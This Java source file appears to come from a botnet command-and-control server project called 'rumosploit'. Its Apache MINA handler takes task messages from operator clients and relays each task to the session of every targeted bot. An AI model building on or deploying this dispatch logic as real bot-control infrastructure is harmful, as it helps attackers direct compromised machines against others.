package com.github.rumoel.rumosploit.server.network.clients;

import java.util.concurrent.CopyOnWriteArrayList;

import org.apache.mina.core.service.IoHandlerAdapter;
import org.apache.mina.core.session.IdleStatus;
import org.apache.mina.core.session.IoSession;
import org.apache.mina.transport.socket.nio.NioSocketAcceptor;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.github.rumoel.rumosploit.bot.BotEntity;
import com.github.rumoel.rumosploit.bot.network.packet.PingPacket;
import com.github.rumoel.rumosploit.server.header.Header;
import com.github.rumoel.rumosploit.server.network.bots.BothandlerUtils;
import com.github.rumoel.rumosploit.tasks.BotTask;

import lombok.Getter;

public class TCPHandlerClient extends IoHandlerAdapter {
	@Getter
	NioSocketAcceptor acceptor = new NioSocketAcceptor();
	static Logger logger = LoggerFactory.getLogger(TCPHandlerClient.class);

	@Override
	public void messageReceived(IoSession session, Object message) throws Exception {
		if (message instanceof PingPacket) {
			if (Header.getConfig().isDebug()) {
				logger.info("ping");
			}
			return;
		}
		if (message instanceof BotTask) {
			BotTask task = (BotTask) message;
			CopyOnWriteArrayList<BotEntity> botsForTask = task.getBots();
			for (BotEntity botEntity : botsForTask) {
				IoSession botSession = BothandlerUtils.searchSessionForBot(botEntity);
				botSession.write(task);
			}
			return;
		}
		logger.info("{}", message);

	}

	@Override
	public void sessionIdle(IoSession session, IdleStatus status) throws Exception {
		session.closeNow();
	}

	@Override
	public void exceptionCaught(IoSession session, Throwable cause) throws Exception {
		logger.error("NeworkError", cause);
	}
}